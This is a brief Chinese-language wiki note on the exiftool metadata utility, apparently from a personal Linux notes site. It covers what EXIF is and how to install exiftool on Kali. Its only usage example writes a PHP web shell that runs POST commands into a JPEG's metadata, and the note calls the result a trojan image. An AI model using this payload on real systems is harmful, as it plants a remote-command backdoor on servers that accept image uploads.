# exiftool

## 页面跳转

[返回网站首页](https://ryancatalina.github.io/)

[返回Linux 的主页](/index.md)

## 一、什么是EXIF

可交换图像文件格式常被简称为Exif（Exchangeable image file format），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。Exif 可以被附加在JPEG、TIFF、RIFF 等文件之中，为其增加有关数码相机拍摄信息的内容和缩略图或图像处理软件的一些版本信息

## 二、exiftool简介

官网：https://exiftool.org/

使用exiftool的理由：

exiftool是经过测试发现对图片EXIF信息解析支持是最好的（如果有更好的请补充）

exiftool支持图片EXIF信息查询，修改及批量操作，还支持其它文件的EXIF操作

安全隐私问题，因为经常有网上暴露图片隐私问题，使用在线需要上传到服务器。采用exiftool保证了图片的安全和隐私，显然是最适合的。
我们知道文件后缀名并不能代表文件的类型格式，比如webp格式后缀名是jpg，换言之一张jpg后缀名图片可能不是jpg图片，可能是web，png，text或其它类型文件。那么怎么快速了解它是哪种类型文件并获取它的一些其它信息呢，这时exiftool就派上用场了，试了下其它几个Exif工具，也用Mac/iOS原生代码测试了下，发现不能有效的读取jpg后缀的webp图片，而exiftool能很好支持。注意并非每一张图片都包含 exif 信息，像微信朋友圈如果发表的不是原图就没有

## 三、exiftool的安装

环境：kali linux 2020.2 amd64

```
apt-get install exiftool
```

## 四、使用

为一个图片生成图片码，图片码为我们的木马
```
exiftool poc.jpg -documentname="<?php echo exec(\$_POST['cmd']); ?>"
```
